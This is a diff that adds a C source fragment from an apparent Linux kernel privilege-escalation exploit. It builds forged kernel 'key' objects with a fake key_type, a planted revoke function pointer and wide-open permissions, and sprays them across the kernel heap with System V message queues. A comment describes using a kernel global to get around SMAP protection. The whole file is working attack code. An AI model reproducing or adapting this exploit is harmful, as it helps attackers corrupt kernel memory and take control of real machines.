@@ -1,0 +1,43 @@
+struct key_type {
+    char * name;
+    size_t datalen;
+    void * vet_description;
+    void * preparse;
+    void * free_preparse;
+    void * instantiate;
+    void * update;
+    void * match_preparse;
+    void * match_free;
+    void * revoke;
+    void * destroy;
+};
+struct key_type my_key_type;
+static int msqid_key;
+char msg_key[192 - 0x30 + sizeof(long)];
+// Replace ksec with a global variable like 'vdso64_enabled' whose value
+// is 1 to bypass SMAP.
+uint32 ksec = 1;
+__attribute__((constructor)) void init_key() {
+	if ((msqid_key = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
+		perror("msgget");
+		exit(1);
+	}
+	*(long*)(&msg_key[sizeof(long) + 0x50 - 0x30]) = (long)&ksec;
+	*(int*)(&msg_key[sizeof(long) + 40]) = 0x0;
+	*(int*)(&msg_key[sizeof(long) + 56]) = 0x3e8; /* geteuid() */
+    *(int*)(&msg_key[sizeof(long) + 64]) = 0x3f3f3f3f;	// key->perm
+    *(unsigned long*)(&msg_key[sizeof(long) + 0x78 - 0x30]) = 1;
+	my_key_type.revoke = (void*)0xdeadbeef;
+	*(unsigned long*)(&msg_key[sizeof(long) + 0x80 - 0x30]) = (unsigned long)&my_key_type;
+}
+void do_keyspray() {
+	int i;
+	for (i = 0; i < 32; i++) {
+		*(long*)msg_key = 0x6161616161616161 + i;
+		if (msgsnd(msqid_key, &msg_key, sizeof(msg_key) - sizeof(long), 0) == -1) {
+			perror("msgsnd");
+			exit(1);
+		}
+	}
+}
+
